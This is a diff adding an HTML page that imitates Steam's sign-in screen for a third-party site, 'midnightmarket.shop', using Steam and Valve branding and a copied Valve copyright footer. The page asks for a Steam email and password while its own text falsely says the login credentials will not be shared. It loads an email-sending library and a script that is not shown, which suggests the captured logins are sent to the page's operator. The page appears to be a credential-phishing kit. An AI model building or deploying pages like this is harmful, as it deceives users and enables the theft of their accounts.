@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SignIn</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="/signin.css" />
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-lg bgDark">
+      <div class="container">
+        <a class="navbar-brand" href="#">
+          <img src="./assets/logo_steam.svg" alt="logo" />
+        </a>
+        <button
+          class="navbar-toggler"
+          type="button"
+          data-bs-toggle="collapse"
+          data-bs-target="#navbarSupportedContent"
+          aria-controls="navbarSupportedContent"
+          aria-expanded="false"
+          aria-label="Toggle navigation"
+        >
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav me-auto mb-2 mb-lg-0 transpaBg">
+            <li class="nav-item">
+              <a class="nav-link active" aria-current="page" href="#">STORE</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#"> COMMUNITY </a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#"> ABOUT </a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="#"> SUPPORT</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+
+    <section>
+      <div class="container mt-5">
+        <div class="row top-box mb-2">
+          <div class="col-sm-12">
+            <div class="top-box2">
+              <h3 class="top-title">
+                Sign into midnightmarket.shop using your Steam account
+              </h3>
+              <p class="top-post">
+                <img src="./assets/icon_info.png" alt="" />
+                Note that midnightmarket.shop is not affiliated with Steam or
+                Valve
+              </p>
+            </div>
+          </div>
+        </div>
+        <div class="row own-row pt-4">
+          <div class="col-sm-6">
+            <div class="form-box">
+              <!-- form code -->
+              <form id="contact" method="post">
+                <fieldset>
+                  <label for="email">Email</label><br />
+                  <input
+                    type="email"
+                    name="email"
+                    tabindex="1"
+                    required
+                    autofocus
+                    class="email"
+                  />
+                </fieldset>
+                <fieldset>
+                  <label for="password"> Password </label><br />
+                  <input
+                    type="password"
+                    tabindex="2"
+                    required
+                    class="password"
+                  />
+                </fieldset>
+                <fieldset>
+                  <button
+                    name="submit"
+                    type="submit"
+                    id="contact-submit"
+                    data-submit="...Sending"
+                    data-bs-dismiss="modal"
+                    class="submit"
+                  >
+                    Submit
+                  </button>
+                </fieldset>
+              </form>
+              <!-- form code -->
+            </div>
+          </div>
+          <div class="col-sm-6">
+            <div class="content-box">
+              <p class="steam-title">
+                By signing into midnightmarket.shop through Steam:
+              </p>
+              <ul>
+                <li>Your Steam login credentials will not be shared.</li>
+                <li>
+                  A unique numeric identifier will be shared with <br />
+                  <strong>midnightmarket.shop</strong>. Through this,
+                  midnightmarket.shop will be able to identify your Steam
+                  community profile and access information about your Steam
+                  account according to your Profile
+                  <strong>Privacy Settings.</strong>
+                </li>
+                <li>
+                  Any information on your <strong>Steam Profile</strong> page
+                  that is set to be publicly viewable may be accessed by
+                  midnightmarket.shop.
+                </li>
+              </ul>
+              <p class="steam-title">
+                By clicking "Sign In" you agree to this data being shared.
+              </p>
+            </div>
+          </div>
+          <div class="col-sm-12">
+            <p class="create-ac">
+              Don't have a Steam account? You can
+            <a href="#">  <strong>create an account</strong></a> for free.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="container">
+        <div class="row">
+          <div class="col-sm-10">
+            <div class="d-flex justify-content-start">
+              <div class="img">
+                <img src="./assets/footerLogo_valve.png" alt="" />
+              </div>
+              <small class="copyRight" style="padding-left: 30px;">
+                © Valve Corporation. All rights reserved. All trademarks are
+                property of their respective owners in the US and other
+                countries. Some geospatial data on this website is provided by
+                <a href="#"> <b>geonames.org</b> </a>.
+              </small>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- bootstrap js file -->
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
+      crossorigin="anonymous"
+    ></script>
+    <!-- sweet alert file -->
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+    <!-- emailjs file -->
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"
+    ></script>
+    <!-- main js file -->
+    <script src="/home.js"></script>
+  </body>
+</html>
